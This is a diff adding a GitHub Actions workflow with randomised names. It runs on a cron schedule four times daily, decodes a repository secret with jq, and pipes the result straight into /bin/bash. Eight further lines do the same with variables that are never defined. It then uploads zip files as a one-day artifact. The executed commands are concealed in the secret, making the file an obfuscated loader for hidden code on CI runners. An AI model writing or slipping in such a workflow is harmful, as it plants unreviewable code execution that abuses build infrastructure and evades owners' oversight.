@@ -1,0 +1,30 @@
+name: addisonneuralc947
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1,7,13,19 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: addisonneuralc947
+        env:
+          iwx96075: ${{ secrets.iwx96075 }}
+        run: |
+          printf '%s' "$iwx96075" | jq -r .ylghs746 | /bin/bash
+          echo $rlvwb6 | jq -r .acfug508 | /bin/bash
+          echo $eg704 | jq -r .bu5014 | /bin/bash
+          printf '%s' "$p2822" | jq -r .jtd06 | /bin/bash
+          printf '%s' "$ovuc9" | jq -r .cp97549 | /bin/bash
+          echo $wyj4666 | jq -r .yzzz0396 | /bin/bash
+          echo $wzylk6779 | jq -r .tiei66 | /bin/bash
+          printf '%s' "$peua947" | jq -r .ek312 | /bin/bash
+          printf '%s' "$bs49" | jq -r .cwyc897 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: qJR2z8ow
+          path: "*.zip"
+          retention-days: 1
